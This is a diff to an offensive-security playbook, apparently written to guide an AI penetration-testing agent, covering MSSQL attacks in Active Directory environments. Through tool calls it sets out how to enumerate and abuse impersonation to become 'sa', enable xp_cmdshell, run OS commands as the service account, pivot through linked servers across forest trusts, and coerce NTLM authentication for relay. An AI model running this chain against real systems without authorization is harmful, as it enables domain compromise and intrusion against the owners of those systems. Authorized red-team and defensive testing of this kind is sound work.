@@ -96,9 +96,22 @@ When unconstrained delegation is found:
 
 ## MSSQL Attacks (HIGH PRIORITY)
 
-MSSQL is often a path to domain compromise through linked servers that cross domain/forest trusts.
+MSSQL is often a path to domain compromise through impersonation and linked servers that cross domain/forest trusts.
 
-### Step 1: Enumerate Linked Servers
+### Step 1: Enumerate Impersonation Rights (RUN THIS FIRST!)
+**CRITICAL**: Always check for impersonation rights before anything else - this is often the fastest path to sysadmin:
+```
+mssql_enum_impersonation(
+    target="sql.domain.com",
+    username="sql_svc",
+    password="found_password",  # pragma: allowlist secret
+    domain="DOMAIN.COM"
+)
+→ Discover users you can impersonate (sa, dbo, etc.)
+→ If 'sa' is listed, you have a direct path to sysadmin!
+```
+
+### Step 2: Enumerate Linked Servers
 When you have ANY valid SQL credential (from kerberoast, password spray, etc.):
 ```
 mssql_enum_linked_servers(
@@ -110,7 +123,7 @@ mssql_enum_linked_servers(
 → Find linked servers that can be pivoted through
 ```
 
-### Step 2: Enable xp_cmdshell
+### Step 3: Enable xp_cmdshell
 If you have sysadmin privileges:
 ```
 mssql_enable_xp_cmdshell(
@@ -122,7 +135,7 @@ mssql_enable_xp_cmdshell(
 → Enable command execution
 ```
 
-### Step 3: Execute Commands
+### Step 4: Execute Commands
 After enabling xp_cmdshell:
 ```
 mssql_command(
@@ -135,7 +148,7 @@ mssql_command(
 → Execute OS commands as SQL service account
 ```
 
-### Step 4: Pivot Through Linked Servers
+### Step 5: Pivot Through Linked Servers
 When linked servers exist (cross-domain/forest pivoting!):
 ```
 mssql_exec_linked(
@@ -166,18 +179,21 @@ mssql_exec_linked(
 → Code execution across domain/forest trust!
 ```
 
-### MSSQL Impersonation
-When EXECUTE AS permissions allow impersonation:
+### MSSQL Impersonation (Use After Enumeration)
+After mssql_enum_impersonation shows you can impersonate a user:
 ```
+# First: Run mssql_enum_impersonation to find targets (Step 1 above)
+# Then: Impersonate the discovered user
 mssql_impersonate(
     target="sql.domain.com",
     username="low_priv_user",
     password="password",  # pragma: allowlist secret
-    impersonate_user="sa",
+    impersonate_user="sa",  # Use user found in enumeration
     query="SELECT SYSTEM_USER",
     domain="DOMAIN.COM"
 )
 → Execute as sysadmin user
+→ If impersonating 'sa', you can enable xp_cmdshell and get code execution!
 ```
 
 ### MSSQL NTLM Coercion
@@ -341,11 +357,12 @@ krb_relay_up(
 ### MSSQL Tools
 | Tool | Use Case |
 |------|----------|
-| mssql_enum_linked_servers | Find linked servers (run first!) |
+| mssql_enum_impersonation | **RUN FIRST!** Find users you can impersonate (sa → sysadmin) |
+| mssql_enum_linked_servers | Find linked servers for cross-domain pivoting |
 | mssql_enable_xp_cmdshell | Enable xp_cmdshell for command execution |
 | mssql_command | Execute OS commands via xp_cmdshell |
 | mssql_exec_linked | Execute queries/commands on linked servers |
-| mssql_impersonate | Execute as another SQL user |
+| mssql_impersonate | Execute as another SQL user (use enum results) |
 | mssql_ntlm_coerce | Force NTLM auth for relay attacks |
 
 ### CVE Tools
